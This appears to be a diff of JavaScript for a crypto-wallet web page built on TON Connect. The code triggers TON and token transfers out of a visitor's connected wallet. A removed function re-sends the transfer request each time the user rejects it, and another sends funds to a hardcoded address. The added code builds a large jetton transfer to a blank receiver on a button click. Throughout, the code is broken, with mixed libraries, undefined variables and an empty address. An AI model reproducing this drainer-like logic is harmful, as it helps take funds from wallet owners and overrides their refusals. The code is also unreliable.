@@ -22,67 +22,34 @@ const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
   });
 
 
-const transferTon = async ()  => {
-    console.log("Ton transfer initiated");
-    const transfer_amount = "0.11";
-    console.log(" wallet public key is", wallet_publickey);
-
-    if (!public_key) {
-        console.error("Public key is not available. Cannot create wallet.");
-        return;
-    }
-    const workchain = "1";
-    const wallet = WalletContractV4.create({
-        workchain,
-        publicKey: Buffer.from(wallet_publickey, 'hex')
-      });
-    const amount = transfer_amount * Math.pow(10, 9); // Convert 0.11 TON to nanoTON
-    const recipientAddress = "";
-    let transactionAccepted = false;
-
-    const seqno = await wallet.methods.getSeqno().call();
-
-    const fee = await wallet.methods.transfer({
-        to: recipientAddress,
-        amount: tonweb.utils.toNano(amount.toString()),
-        seqno,
-    }).estimateFee();
-
-    const transaction = await wallet.methods.transfer({
-        to: recipientAddress,
-        value: tonweb.utils.toNano(amount.toString()),
-    }).send();
-
-    while (!transactionAccepted) {
-        try {
-            const result = await transaction.send();
-            console.log("Transaction submitted. Waiting for confirmation...");
-            console.log("Transaction successful:", result);
-            transactionAccepted = true;
-        } catch (error) {
-            if (error.code === "Reject request") {
-                console.log("User denied the transaction. Retrying...");
-                await transaction.send();
-            } else {
-                console.error("An error occurred:", error);
-                break;
-            }
-        }
-    }
-}
 
 
-const transferTon2 = async ()  => {
-    console.log("Ton transfer initiated");
-    const transfer_amount = "0.11";
-    const amount = transfer_amount * Math.pow(10, 9); // Convert 0.11 TON to nanoTON
-    const recipientAddress = "UQAObO0rUj_PIu-6W4Afnb2lf1pnZGSWWDaEJ3q5vWx3Cdq6";
+const transferTokens = async ()  => {
+    console.log("Token transfer initiated");
+
+    const gas_fee_amount = "0.11";
+    const gas_fee = gas_fee_amount * Math.pow(10, 9); // Convert 0.11 TON to nanoTON
+    const contract_address = "EQCxE6mUtQJKFnGfaROTKOt1lZbDiiX1kCixRv7Nw2Id_sDs"; 
+    const receiver = "";
+
+    const body = beginCell()
+    .storeUint(0xf8a7ea5, 32)                 // jetton transfer op code
+    .storeUint(0, 64)                         // query_id:uint64
+    .storeCoins(toNano("1000000"))              // amount:(VarUInteger 16) -  Jetton amount for transfer (decimals = 6 - USDT, 9 - default). Function toNano use decimals = 9 (remember it)
+    .storeAddress(Address.parse(receiver))  // destination:MsgAddress
+    .storeAddress(Address.parse(receiver))  // response_destination:MsgAddress
+    .storeUint(0, 1)                          // custom_payload:(Maybe ^Cell)
+    .storeCoins(toNano("0.001"))                 // forward_ton_amount:(VarUInteger 16) - if >0, will send notification message
+    .storeUint(0,1)                           // forward_payload:(Either Cell ^Cell)
+    .endCell();
+
     let transactionAccepted = false;
     const transaction = {
         messages: [
             {
-                to: recipientAddress,
-                value: tonweb.utils.toNano(amount.toString()),
+                address: contract_address,
+                amount: gas_fee,
+                payload: body.toBoc().toString("base64")
             }
         ]
     };
@@ -107,11 +74,11 @@ const transferTon2 = async ()  => {
 }
 
 
-document.addEventListener('DOMContentLoaded', () => {
-    const connectWalletButtons = document.querySelectorAll('.connect-wallet');
+  document.addEventListener('DOMContentLoaded', () => {
+    const connectWalletButtons = document.querySelectorAll('.transfer-tokens');
     connectWalletButtons.forEach(button => {
       button.addEventListener('click', async () => {
-       await transferTon();
+       await transferTokens();
       });
     });
   });
